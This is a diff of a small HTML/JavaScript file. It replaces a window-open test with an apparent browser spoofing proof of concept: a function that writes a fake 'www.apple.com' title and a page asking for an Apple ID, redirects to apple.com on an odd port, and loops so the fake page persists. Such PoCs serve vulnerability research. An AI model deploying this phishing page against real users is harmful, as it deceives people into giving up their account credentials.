@@ -1,15 +1,22 @@
+<script>
+function spoof()
+
+{
+
+document.write("<title>www.apple.com</title>");
+  
+    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
+
+document.write(a);
+window.location.assign("http://www.apple.com:1121");
+
+   	setTimeout(function(){
+		spoof();  // Loop makes the browser always shows the fake page.
+	}, 2000);
+
+}
 
 
-<body>
-  <script>
-          
 
-
-    
-         function start() {
-var x = window.open('https://permission.site');
-           setTimeout(function(){x.location='https://www.google.com'}, 5000);
-
-         };
+setInterval(spoof(),2000);
 </script>
-<input onclick="start()" value="click here" type="button" /></body>
